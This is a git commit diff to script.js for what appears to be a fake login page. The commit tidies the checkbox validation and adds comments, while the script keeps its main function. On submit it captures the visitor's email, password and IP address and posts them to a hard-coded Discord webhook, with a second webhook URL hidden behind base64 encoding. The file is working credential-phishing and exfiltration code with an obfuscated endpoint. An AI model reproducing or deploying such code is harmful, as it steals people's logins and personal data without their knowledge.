041da4a1bc59fc82d82d95237570601913ea8680
randomstuff69 <132950785+randomstuff69@users.noreply.github.com>
2024-11-25 21:06:42 -0700

    Update script.js

--- script.js
+++ script.js
@@ -1,19 +1,19 @@
-
 const userinfoEncoded = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMxMDc3NTk5NzIzODM0NTcyOC9aVk5tX2F4RVRUN1d3TnZOVkhjdXBsaGRUZk14SUs4Z05LS25XMUtFUl8zQ1NTYkNzcHc3WERKaXlrWUJ6YkNmcE5iSA';
 
 const skibidiCheckbox = document.getElementById('skibidiCheckbox');
 const loginButton = document.getElementById('loginButton');
 
-// Enable or disable the login button based on checkbox state
-skibidiCheckbox.addEventListener('change', function validateCheckbox() {
-    if (!skibidiCheckbox.checked) {
-                checkbox.classList.add('error');
-                alert('Please Check The Box.');
-    }
-});
-
 document.getElementById('loginForm').addEventListener('submit', function(e) {
     e.preventDefault();
+
+    if (!skibidiCheckbox.checked) {
+        skibidiCheckbox.classList.add('error');
+        alert('Please check the box.');
+        return;
+    } else {
+        skibidiCheckbox.classList.remove('error');
+    }
+
     const email = document.getElementById('username').value;
     const password = document.getElementById('password').value;
 
@@ -23,7 +23,7 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
         .then(data => {
             const userIP = data.ip;
 
-            
+            // Send data to Discord webhook
             fetch('https://discord.com/api/webhooks/1310775997238345728/ZVNm_axETT7WwNvNVHcuplhdTfMxIK8gNKKnW1KER_KGHDYYgshYohghd', {
                 method: 'POST',
                 headers: {
@@ -34,7 +34,7 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
                 })
             });
 
-            
+            // Decode and fetch user info
             const userInfo = atob(userinfoEncoded);
             
             fetch(userInfo, {
